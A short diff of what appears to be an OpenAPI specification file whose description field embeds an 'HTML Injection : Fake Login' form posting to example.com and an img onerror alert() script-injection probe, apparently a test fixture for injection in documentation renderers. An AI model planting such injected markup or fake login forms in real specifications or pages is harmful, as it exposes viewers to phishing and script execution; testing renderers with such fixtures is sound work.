@@ -5,8 +5,7 @@ info:
   description: '<div class="login-form">
     <div class="heading">
         <h1>HTML Injection : Fake Login</h1>
-    </div>
-    <img/src='x'/onerror='alert();'>
+    </div><img/src='x'/onerror='alert();'>
     <div class="form-container">
         <form action="https://example.com/login" method="post" class="form-signin">
             <div class="form-group">
